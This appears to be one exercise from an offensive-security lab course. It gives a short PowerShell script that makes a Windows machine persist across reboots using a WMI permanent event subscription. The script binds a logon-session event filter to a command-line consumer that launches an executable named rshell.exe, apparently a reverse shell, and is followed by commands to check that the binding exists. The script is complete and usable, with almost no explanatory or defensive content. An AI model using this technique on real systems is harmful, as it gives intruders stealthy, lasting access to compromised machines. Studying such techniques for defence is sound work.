## Hands On 9
### Event Consumers

#### Achieve reboot persistance on your lab machine using WMI permenant Event consumer
```
$filterName = 'MyFilter'
$filterNS = "root\cimv2"
$consumerName = 'MyConsumer'
$payload = "C:\Windows\Temp\rshell.exe"

$query ="SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2"
$filterPath = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
$consumerPath = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{name=$filterName; CommandLineTemplate = $payload}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$filterPath; Consumer=$consumerPath}
```

To verify:
```
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```
